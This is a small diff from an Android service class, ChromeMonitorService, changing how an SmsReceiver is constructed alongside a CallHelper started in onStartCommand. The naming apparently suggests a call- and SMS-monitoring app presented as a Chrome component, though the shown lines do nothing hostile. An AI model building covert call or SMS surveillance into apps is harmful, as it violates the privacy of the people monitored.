@@ -16,7 +16,7 @@ public class ChromeMonitorService extends Service {
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
         callHelper = new CallHelper(this);
-        smsReceiver = new SmsReceiver();
+        smsReceiver = new SmsReceiver(this);
   
         int res = super.onStartCommand(intent, flags, startId);
         callHelper.start();
